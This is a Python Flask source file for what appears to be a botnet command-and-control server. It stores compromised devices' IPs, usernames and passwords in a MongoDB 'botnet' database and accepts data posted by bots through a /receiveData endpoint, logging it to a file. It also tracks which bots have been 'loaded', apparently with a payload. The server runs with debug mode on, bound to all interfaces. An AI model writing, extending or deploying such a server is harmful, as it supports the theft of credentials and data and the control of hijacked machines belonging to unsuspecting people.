import random, os, json, datetime, time ,string, hashlib, re, csv
from flask import *
from pymongo import *
from flask_cors import CORS
from collections import Counter

app = Flask(__name__)
CORS(app)


@app.errorhandler(404)
def page_not_found(e):
    return "bla",404

@app.route('/')
def index():
    return('index')

@app.route('/login')
def loginPage():
    return('login')

botCounter=0

# client = MongoClient('mongo',27017)
client = MongoClient(port=27017)
bots_table  = client.botnet.bots
counter = client.botnet.orgid_counter

### =========================================================================================================
### id increment
### =========================================================================================================



def getNextSequence(collection,name):
    collection.update_one( { '_id': name },{ '$inc': {'seq': 1}})
    return int(collection.find_one({'_id':name})["seq"])




### =========================================================================================================
### API's
### =========================================================================================================

## Get data from bots 

"""
input
{
    "ip": 
    "data": 
}

output into a file data.txt

"""
@app.route('/receiveData', methods=['POST'])
def data():
    f = open("data.txt", "a")
    j = request.get_json()
    botip = j['ip']
    data = j['data']
    f.write("ip = "+ botip + ":" + "data = "+ data)
    f.close()   
    return jsonify({'code' : 200})


### =========================================================================================================
###  remove bot API
### =========================================================================================================
@app.route('/removeBot/<ip>', methods=['GET'])
def removeBot(ip):
    val = bots_table.find_one({"ip":ip})
    if(val is not None):
        bots_table.delete_one({"ip":ip})
        return jsonify({'code':200})
    else:
        return jsonify({'code':200,"data":"ip not found"})



### =========================================================================================================
###  Add BOT API
### =========================================================================================================


@app.route('/addbot', methods=['POST'])
def addbot():
    j = request.get_json()
    val = bots_table.find_one({"ip":j['ip']})
    if(val is not None):
        bots_table.delete_one({"ip":j['ip']})
    nextId = getNextSequence(counter,"botId")  
    result=bots_table.insert_one({'botId':nextId,"ip":j['ip'],"username":j['username'],"password":j['password'],"loaded":0})
    return jsonify({'code':200})


### =========================================================================================================
###  set loaded flag BOT API
### =========================================================================================================

@app.route('/setloaded/<ip>', methods=['GET'])
def setloaded(ip):
    val = bots_table.find_one({"ip":ip})
    if(val is None):
        return jsonify({'code':200,"data":"device not available"})
    bots_table.update_one( { 'ip': ip },{ '$inc': {'loaded': 1}})
    return jsonify({'code':200})

### =========================================================================================================
###  unset loaded flag BOT API
### =========================================================================================================

@app.route('/unsetloaded/<ip>', methods=['GET'])
def unsetloaded(ip):
    val = bots_table.find_one({"ip":ip})
    if(val is None):
        return jsonify({'code':200,"data":"device not available"})
    bots_table.update_one( { 'ip': ip },{ '$inc': {'loaded': -1}})
    return jsonify({'code':200})

### =========================================================================================================
###  Get BOT APIs                                                                                       done
### =========================================================================================================

@app.route('/getBots', methods=['GET'])
def getBots():
    val=bots_table.find()
    d = dict()
    botCounter = 1
    for x in val:
        x.pop("_id")
        d[botCounter] = x
        botCounter+=1
    return jsonify(d)


### =========================================================================================================
###  Get number of BOTs API                                                                             done
### =========================================================================================================
@app.route('/getbotNumber', methods=['GET'])
def number():
    val=bots_table.find()
    botCounter = 0
    for x in val:
        x.pop("_id")
        botCounter+=1
    return jsonify({"number":botCounter})


### =========================================================================================================
###  Get bots with unset loader flag of BOTs API                                                                             done
### =========================================================================================================
@app.route('/getbotunset', methods=['GET'])
def getbotunset():
    val=bots_table.find()
    d = dict()
    botCounter = 1
    for x in val:
        x.pop("_id")
        if(x["loaded"] == 0):
            d[botCounter] = x
            botCounter+=1
    return jsonify(d)








if __name__ == "__main__":
    port = int(os.environ.get('PORT', 5000))
    app.run(debug=True, host='0.0.0.0', port=port)